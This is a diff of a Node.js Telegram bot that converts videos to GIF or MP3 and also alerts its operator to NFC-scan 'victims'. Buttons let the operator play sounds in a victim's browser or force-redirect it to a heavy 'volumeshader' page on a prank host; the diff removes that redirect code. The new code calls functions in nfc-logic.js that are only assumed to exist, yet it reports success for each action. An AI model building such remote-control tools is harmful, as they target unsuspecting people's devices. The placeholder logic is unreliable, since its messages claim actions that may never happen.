@@ -23,6 +23,9 @@ if (!fs.existsSync(uploadDir)){
     fs.mkdirSync(uploadDir, { recursive: true });
 }
 
+// Підключення nfc-logic.js (припускаємо, що там є функції для дій)
+const nfcLogic = require('./nfc-logic.js');
+
 console.log('🤖 TELEGRAM BOT ЗАПУЩЕНО З КОНВЕРТЕРОМ...');
 
 // --- 1. КОМАНДА /START ---
@@ -39,7 +42,26 @@ bot.onText(/\/start/, (msg) => {
 2. 🎬 Если бросишь **видео**, я предложу сделать из него **GIF** или **MP3**.
 3. 🚨 Уведомлять о новых жертвах (сканирование NFC) с кнопками для активации.
 
-Бросай файл или жди уведомлений!`, { parse_mode: 'Markdown' });
+Бросай файл или жди уведомлений!`, 
+    { 
+        parse_mode: 'Markdown',
+        reply_markup: {
+            inline_keyboard: [
+                [
+                    { text: 'Создать ссылку для NFC', callback_data: 'create_nfc_link' },
+                    { text: 'Изменить картинку', callback_data: 'change_image' }
+                ],
+                [
+                    { text: 'Изменить звук', callback_data: 'change_sound' },
+                    { text: 'Вместо фото видео', callback_data: 'video_instead_photo' }
+                ],
+                [
+                    { text: 'Bombardio', callback_data: 'bombardio' },
+                    { text: 'Звук', callback_data: 'play_sound' }
+                ]
+            ]
+        }
+    });
 });
 
 // --- 2. ОБРОБКА ВХІДНИХ ФАЙЛІВ ---
@@ -99,10 +121,10 @@ bot.on('message', async (msg) => {
     }
 });
 
-// --- 3. ОБРОБКА КНОПОК (GIF / MP3) ---
+// --- 3. ОБРОБКА КНОПОК (GIF / MP3 + Нові NFC кнопки) ---
 bot.on('callback_query', async (query) => {
     const chatId = query.message.chat.id;
-    const data = query.data; // Формат: "action|filename" або "play_sound|roomId" тощо
+    const data = query.data; // Формат: "action|param" або просто 'action'
     
     const [action, param] = data.split('|');
 
@@ -110,7 +132,7 @@ bot.on('callback_query', async (query) => {
 
     if (action === 'to_gif' || action === 'to_mp3') {
         // Обробка конвертації (як раніше)
-        const inputPath = path.join(uploadDir, param);
+        const inputPath = path.join(uploadDir, param || ''); // Якщо param є
 
         // Перевірка чи існує файл
         if (!fs.existsSync(inputPath)) {
@@ -157,19 +179,40 @@ bot.on('callback_query', async (query) => {
                 });
         }
     } else {
-        // Обробка NFC-кнопок (play_sound, redirect)
-        const roomId = param;
-        if (!global.io) {
-            bot.sendMessage(chatId, '❌ Ошибка: Нет доступа к серверу.');
-            return;
-        }
-
-        if (action === 'play_sound') {
-            global.io.to(roomId).emit('play-sound');
-            bot.sendMessage(chatId, '🔊 Звук включен!');
-        } else if (action === 'redirect') {
-            global.io.to(roomId).emit('force-redirect', { url: "https://prank-nfc.onrender.com/volumeshader_bm.html" });
-            bot.sendMessage(chatId, '💣 Bombardio активирован!');
+        // Обробка NFC-кнопок (використовуємо nfc-logic.js)
+        try {
+            let response = '';
+            switch (action) {
+                case 'create_nfc_link':
+                    response = nfcLogic.createNfcLink(); // Припускаємо функцію в nfc-logic.js
+                    bot.sendMessage(chatId, `Ссылка для NFC создана: ${response}`);
+                    break;
+                case 'change_image':
+                    response = nfcLogic.changeImage(); // Placeholder
+                    bot.sendMessage(chatId, 'Картинка изменена!');
+                    break;
+                case 'change_sound':
+                    response = nfcLogic.changeSound(); // Placeholder
+                    bot.sendMessage(chatId, 'Звук изменен!');
+                    break;
+                case 'video_instead_photo':
+                    response = nfcLogic.videoInsteadPhoto(); // Placeholder
+                    bot.sendMessage(chatId, 'Видео вместо фото установлено!');
+                    break;
+                case 'bombardio':
+                    response = nfcLogic.bombardio(); // Placeholder
+                    bot.sendMessage(chatId, 'Bombardio активирован!');
+                    break;
+                case 'play_sound':
+                    response = nfcLogic.playSound(); // Placeholder
+                    bot.sendMessage(chatId, 'Звук включен!');
+                    break;
+                default:
+                    bot.sendMessage(chatId, 'Неизвестное действие.');
+            }
+            // Якщо є відповідь від nfc-logic, обробити
+        } catch (err) {
+            bot.sendMessage(chatId, `Ошибка: ${err.message}`);
         }
     }
 });
